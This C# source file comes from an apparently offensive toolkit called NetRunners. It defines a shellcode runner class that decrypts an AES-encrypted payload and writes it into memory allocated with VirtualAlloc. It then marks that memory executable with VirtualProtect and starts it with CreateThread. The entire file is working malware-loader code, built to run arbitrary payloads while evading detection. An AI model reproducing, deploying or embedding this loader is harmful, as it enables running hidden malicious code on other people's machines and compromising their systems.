using System;
using System.Runtime.InteropServices;
using NetRunners.Interfaces;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Data.WinConstants;
using static NetRunners.Delegates.Delegate;
using static NetRunners.Data.EncryptedData;
using static NetRunners.Helpers.Helper;

namespace NetRunners.Runners
{
    /// <summary>
    /// This class contains the Basic Shellcode Runner.
    /// Retrieves encrypted payload from Shellcode class.
    /// Retrieves win32 apis from Win32APIs class, retrieves needed structures from Structures class.
    /// </summary>
    public class DefaultRunner : IRunner
    {
        public void Run()
        {
            IntPtr pMemory;
            IntPtr hThread;
            uint oldProtect;
            var payload = GetPayloadAndSize();
            byte[] buf = payload.buf;
            int sBuf = payload.sBuf;

            try
            {
                // call virtual alloc to allocate memory space here
                pMemory = VirtualAlloc(IntPtr.Zero, (UIntPtr)sBuf, 0x3000, PAGE_READWRITE);
                if (pMemory == IntPtr.Zero)
                    throw new InvalidOperationException($"VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()} ");

                // try to decrypt buf
                try
                {
                    buf = DecryptBytesToBytesAes(buf, AesKey);
                }
                catch (Exception e)
                {
                    throw new InvalidOperationException("Decryption of buffer failed.", e);
                }

                // copy shellcode to allocated memory
                Marshal.Copy(buf, 0, pMemory, sBuf);
                // change memory protection
                int bVP = VirtualProtect(pMemory, (UIntPtr)sBuf, PAGE_EXECUTE_READ, out oldProtect);
                if (bVP != 1) // not true
                {
                    throw new InvalidOperationException($"VirtualProtect failed with error code: {Marshal.GetLastWin32Error()}");
                }

                // execute shellcode
                hThread = CreateThread(IntPtr.Zero, 0, pMemory, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                    throw new InvalidOperationException($"CreateThread failed with error code: {Marshal.GetLastWin32Error()} ");

                // call wait function
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            catch (Exception e)
            {
                // handle error
                Console.WriteLine($"An error occurred: {e.Message}");
                throw;
            }
        }
    }
}